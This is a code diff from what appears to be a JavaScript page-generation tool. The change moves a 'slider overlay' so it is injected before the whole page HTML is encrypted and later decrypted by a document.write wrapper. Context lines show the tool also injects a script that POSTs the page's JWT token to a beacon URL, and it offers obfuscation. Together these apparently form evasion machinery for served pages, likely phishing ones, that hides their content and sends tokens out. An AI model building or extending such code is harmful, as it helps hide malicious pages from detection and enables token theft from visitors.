@@ -817,6 +817,19 @@ async function renderPageHtml(link, user, options) {
         const beaconScript = '<script>fetch(\'' + beaconUrl + '\',{method:\'POST\',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script>';
         html = html.replace('</body>', beaconScript + '</body>');
 
+        // ═══════════════════════════════════════════
+        // INJECT SLIDER OVERLAY FOR EXPORT MODE (before encryption)
+        // The slider overlay must be INSIDE the encrypted HTML so it survives
+        // the document.write() call in the decryption wrapper
+        // ═══════════════════════════════════════════
+        if (isSliderDesign) {
+            const sliderOverlay = buildSliderOverlay(sliderData, link, doObfuscate);
+            html = html.replace(/<body[^>]*>/i, function(match) {
+                return match + sliderOverlay;
+            });
+            console.log('[Templateloader] Slider overlay injected before encryption for export');
+        }
+
         // Encrypt the entire HTML payload
         try {
             const encrypted = encryptPayload(html);
@@ -897,19 +910,6 @@ async function renderPageHtml(link, user, options) {
         // Replace any other remaining placeholders with empty string
         html = html.replace(/\{\{[^}]+\}\}/g, '');
         console.log('[Templateloader] Placeholders cleaned up');
-    }
-
-    // ═══════════════════════════════════════════
-    // INJECT SLIDER OVERLAY FOR EXPORT MODE (after encryption)
-    // The slider overlay contains <script> tags which won't execute
-    // inside document.write(), so we inject it AFTER the decryption wrapper
-    // ═══════════════════════════════════════════
-    if (isSliderDesign && options.exportForDownload) {
-        const sliderOverlay = buildSliderOverlay(sliderData, link, doObfuscate);
-        html = html.replace(/<\/body>/i, function(match) {
-            return sliderOverlay + match;
-        });
-        console.log('[Templateloader] Slider overlay injected after encryption wrapper for export');
     }
     
     return html;
